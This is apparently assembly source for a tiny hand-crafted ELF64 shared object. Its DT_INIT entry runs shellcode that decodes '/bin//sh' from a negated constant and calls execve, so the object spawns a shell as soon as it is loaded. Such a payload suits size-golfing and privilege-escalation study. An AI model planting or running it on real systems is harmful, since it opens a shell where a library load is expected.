bits 64
            org 0x08048000

ehdr:                                           ; Elf64_Ehdr
            db  0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db  0
            dw  3                               ;   e_type
            dw  62                              ;   e_machine
            dd  1                               ;   e_version
            dq  _start                          ;   e_entry
            dq  pht_start                       ;   e_phoff
    ; part 1
    _start: 
            mov rbx, 0xFF978CD091969DD1
            jmp part_2
            dw  0x40                            ;   e_ehsize
            dw  0x38                            ;   e_phentsize
            dw  2                               ;   e_phnum
    part_2:
            neg rbx
            jmp part_3

pht_start equ $ - $$

phdr_load:                                           ; Elf64_Phdr
            dd  1                               ;   p_type
            dd  7                               ;   p_flags
            dq  0                               ;   p_offset
            dq  $$                              ;   p_vaddr
    part_3:
            xor eax, eax
            push rbx
            push rsp
            pop rdi
            cdq
            push rdx
            push rdi
            push rsp
            pop rsi
            mov al, 0x3b
            syscall
            db 0,0 ; remainder
            dq  filesize                        ;   p_memsz
            dq  0x1000                          ;   p_align

phdr_dyn:                                           ; Elf64_Phdr
            dd  2                               ;   p_type
            dd  6                               ;   p_flags
            dq  dyn_offset                      ;   p_offset
            dq  _dyn                            ;   p_vaddr
    ; dynamic table in free space
    dyn_offset equ $ - $$
    _dyn:
            dq 0Ch, _start ; DT_INIT
            dq 5, 0   ; DT_STRTAB
            dq 6, 0    ; DT_SYMTAB

filesize      equ     $ - ehdr